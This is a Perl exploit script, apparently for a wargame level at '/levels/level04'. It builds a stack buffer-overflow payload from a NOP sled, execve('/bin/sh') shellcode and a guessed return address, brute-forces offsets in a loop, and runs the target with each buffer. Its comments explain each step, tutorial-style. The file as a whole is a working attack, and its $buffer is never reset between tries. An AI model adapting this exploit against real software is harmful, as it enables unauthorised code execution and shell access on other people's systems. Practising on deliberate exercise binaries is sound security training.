#!/usr/bin/perl 


$shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89". 
"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c". 
"\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff". 
"\xff\xff/bin/sh"; 


$len = 1024 + 8; # The length needed to own EIP. 
$len = 1034;
$len = 1040; #Maybe 1035
#$ret = 0xbffff770; # The stack pointer at crash time. 
$ret = 0xffa36ce0;
$nop = "\x90"; # x86 NOP 
$offset = -1000; # Default offset to try. 

for($j=-1048;$j < -990; $j++){
  print "Offset:$j";
  $offset = $j;

  for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) { 
  $buffer .= $nop; 
  } 

  # [ Buffer: NNNNNNNNNNNNNN ] 

  # Add a lot of x86 NOP's to the buffer scalar. (885 NOP's) 

  $buffer .= $shellcode; 

  # [ Buffer: NNNNNNNNNNNNNNSSSSS ] 

  # Then we add the shellcode to the buffer. We made room for the shellcode 
  # above. 

  print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n"); 

  # Here we add the offset to the stack pointer value - convert it to hex, 
  # and then print it out. 

  $new_ret = pack('l', ($ret + $offset)); 

  # pack is a function which will take a list of values and pack it into a 
  # binary structure, and then return that string containing the structure. 
  # So, pack the stack pointer / ESP + offset into a signed long - (4 bytes). 

  for ($i += length($shellcode); $i < $len; $i += 4) { 
    $buffer .= $new_ret; 
  } 

  # [ Buffer: NNNNNNNNNNNNNNNNSSSSSRRRRRR ] 

  # Here we add the length of the shellcode to the scalar $i, which after the 
  # first for loop had finished held the value "885" (bytes), then the for loop 
  # adds the $new_ret scalar until $buffer has the size of 1032 bytes. 
  # 
  # Could also have been written as this: 
  # 
  # until (length($buffer) == $len) { 
  # $buffer .= $new_ret; 
  #} 

  #local($ENV{'KIDVULN'}) = $buffer; exec("/bin/vuln");

  #print("Exec: /levels/level04 "+buffer)
  print "Executing\n";
  print "Buffer:";
  print length($buffer);
  print "\n";
  print "Buffer:";
  print unpack('h',$buffer);
  print "\n";
  #exec("/levels/level04 "+$buffer);
  #exec("/levels/level04 "+$buffer);
  #system("echo -e \"$buffer\" \| xargs /levels/level04"); 
  system("/levels/level04 \"$buffer\"");
  print "Done\n";
}
